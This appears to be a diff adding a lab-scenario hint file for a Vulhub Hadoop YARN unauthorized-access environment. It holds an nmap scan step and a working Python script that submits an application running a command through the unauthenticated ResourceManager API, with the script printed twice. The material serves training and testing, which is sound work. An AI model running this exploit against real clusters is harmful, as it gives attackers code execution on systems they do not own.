@@ -1,0 +1,93 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: hadoop/unauthorized-yarn
+hint_levels:
+  low:
+  - Inspect the hadoop service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8088. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8088 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): resourcemanager: 8088/tcp → container 8088/tcp. These are recipe
+    defaults; use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8088`.'
+  high:
+  - 'Vulnerability: Hadoop YARN ResourceManager Unauthorized Access.'
+  - |-
+    Submit an application through the exposed ResourceManager API
+
+    The included exploit.py uses the unauthenticated application API. This minimal adaptation submits `id`
+    instead of requiring a reverse-shell listener:
+
+    ```python
+    import requests
+    base = 'http://{{NODE_IP}}:8088/ws/v1/cluster/apps'
+    created = requests.post(base + '/new-application', timeout=10)
+    created.raise_for_status()
+    application_id = created.json()['application-id']
+    response = requests.post(base, json={
+        'application-id': application_id,
+        'application-name': 'identity-check',
+        'am-container-spec': {'commands': {'command': 'id'}},
+        'application-type': 'YARN',
+    }, timeout=10)
+    response.raise_for_status()
+    print(application_id, response.status_code)
+    ```
+
+    Inspect the application's output logs in the ResourceManager UI for the execution identity.
+    The submission response alone confirms acceptance, not successful command execution.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/hadoop/unauthorized-yarn/README.md'
+  - |-
+    Additional public references:
+    - http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf
+    - https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html
+access_instructions:
+  title: Hadoop YARN ResourceManager Unauthorized Access
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8088. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8088 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): resourcemanager: 8088/tcp → container 8088/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8088`.
+  - title: Submit an application through the exposed ResourceManager API
+    instructions: |-
+      The included exploit.py uses the unauthenticated application API. This minimal adaptation submits `id`
+      instead of requiring a reverse-shell listener:
+
+      ```python
+      import requests
+      base = 'http://{{NODE_IP}}:8088/ws/v1/cluster/apps'
+      created = requests.post(base + '/new-application', timeout=10)
+      created.raise_for_status()
+      application_id = created.json()['application-id']
+      response = requests.post(base, json={
+          'application-id': application_id,
+          'application-name': 'identity-check',
+          'am-container-spec': {'commands': {'command': 'id'}},
+          'application-type': 'YARN',
+      }, timeout=10)
+      response.raise_for_status()
+      print(application_id, response.status_code)
+      ```
+
+      Inspect the application's output logs in the ResourceManager UI for the execution identity.
+      The submission response alone confirms acceptance, not successful command execution.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/hadoop/unauthorized-yarn/README.md
+  readme_sha256: 3602fb9e84f092b40e0ee96d9a7dd94f3e3f9bde585551e0ac049e19698adea7
+  compose_sha256: 387920b82eb406c10a2f5d491b14af1b55f7d8065c47e0f958e701b28da5da9b
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
